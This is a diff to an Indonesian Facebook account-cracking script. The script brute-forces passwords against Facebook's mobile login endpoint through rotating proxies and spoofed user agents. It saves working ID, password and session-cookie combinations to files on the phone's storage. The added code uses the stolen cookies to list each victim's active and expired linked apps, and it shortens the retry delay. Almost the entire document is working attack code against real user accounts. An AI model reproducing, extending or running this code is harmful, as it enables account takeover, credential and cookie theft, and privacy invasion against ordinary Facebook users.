@@ -44,17 +44,17 @@ except Exception as e:
 	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
-	a='Mozilla/5.0 (Windows NT {str(rr(7,9))}.0) Gecko/20100101 Firefox/31.0'
+	a='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/85.0.4183.121 Safari/537.36'
 	b=random.randrange(1, 9)
 	c=random.randrange(1, 9)
 	d='Nokia'
 	e=random.randrange(100, 9999)
-	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) Windows NT {str(rr(7,9))}.0) Gecko/20100101 Firefox/{str(rc(bb))}'
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) Windows NT 10.0; Win64; x64) Gecko/85.0.4183.121 Safari/537.36'
 	g=random.randrange(1, 9)
 	h=random.randrange(1, 4)
 	i=random.randrange(1, 4)
 	j=random.randrange(1, 4)
-	k='Firefox/{str(rc(bb))}'
+	k='Safari/537.36'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen2.append(uaku)
 
@@ -147,7 +147,7 @@ def banner():
 \t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\] 
 \t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
 \t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
-			{m}•{k}•{h}•{sir} Author : Asal_Recode {x}{m}•{k}•{h}•{x}''')
+			{m}•{k}•{h}•{sir} Author : KING.OF.BACOT {x}{m}•{k}•{h}•{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -245,7 +245,7 @@ def result():
 	print('>> 3. Kembali	')
 	kz = input(f'\n>> Pilih : ')
 	if kz in ['2']:
-		try:vin = os.listdir('CP')
+		try:vin = os.listdir('/sdcard/kob.CP')
 		except FileNotFoundError:
 			print('>> File Tidak Di Temukan ')
 			time.sleep(3)
@@ -258,7 +258,7 @@ def result():
 			cih = 0
 			lol = {}
 			for isi in vin:
-				try:hem = open('CP/'+isi,'r').readlines()
+				try:hem = open('/sdcard/kob.CP/'+isi,'r').readlines()
 				except:continue
 				cih+=1
 				if cih<10:
@@ -274,7 +274,7 @@ def result():
 			except KeyError:
 				print('>> Pilih Yang Bener Kontol ')
 				back()
-			try:lin = open('CP/'+geh,'r').read().splitlines()
+			try:lin = open('/sdcard/kob.CP/'+geh,'r').read().splitlines()
 			except:
 				print('>> File Tidak Di Temukan ')
 				time.sleep(2)
@@ -288,7 +288,7 @@ def result():
 			input(f'{x}[{m} Klik Enter{x} ]')
 			back()
 	elif kz in ['1']:
-		try:vin = os.listdir('OK')
+		try:vin = os.listdir('/sdcard/kob.OK')
 		except FileNotFoundError:
 			print('>> File Tidak Di Temukan ')
 			time.sleep(2)
@@ -301,7 +301,7 @@ def result():
 			cih = 0
 			lol = {}
 			for isi in vin:
-				try:hem = open('OK/'+isi,'r').readlines()
+				try:hem = open('/sdcard/kob.OK/'+isi,'r').readlines()
 				except:continue
 				cih+=1
 				if cih<10:
@@ -317,7 +317,7 @@ def result():
 			except KeyError:
 				print('>> Pilih Yang Bener Kontol ')
 				back()
-			try:lin = open('OK/'+geh,'r').read().splitlines()
+			try:lin = open('/sdcard/kob.OK/'+geh,'r').read().splitlines()
 			except:
 				print('>> File Tidak Di Temukan ')
 				time.sleep(2)
@@ -712,24 +712,49 @@ def crack(idf,pwv):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="103"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"SAMSUNG"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&errorcode=1348092&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{b}AKUN CP\n{P} ID  : {kk}{kk}{idf}{P}          \n     PASWORD  : {kk}{pw}          {P}\n UA  : {M}{ua}{P}           \n')
+				print(f'\r{x}==>{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				kukis = kuki.replace(f'c_user={idf};datr','sb')
-				print(f'\r{h}AKUN OK \n{P} ID  : {hh}{idf}{P}          \n     PASWORD  : {hh}{pw}          {P}\n KUE : {hh}{kukis}{P}\n')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-				break				
-				
+				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 11; CPH2127 Build/RKQ1.201217.002) Source/1 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]"}
+				if 'no' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print(f'\r{x}==> {H}{idf}|{pw}|{kuki}{N}')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					break
+				elif 'ya' in taplikasi:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					user=idf
+					infoakun = ""
+					session = requests.Session()
+					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
+					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
+					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
+					nok=1
+					for muncul in apkaktif:
+						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
+						nok+=1
+
+					hit=0
+					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
+					hit=0
+					for muncul in apkexp:
+						hit+=1
+						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
+					print(f'\r{x}==> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
+					ok+=1
+					break
+
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			time.sleep(1)
 	loop+=1
 
 #--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
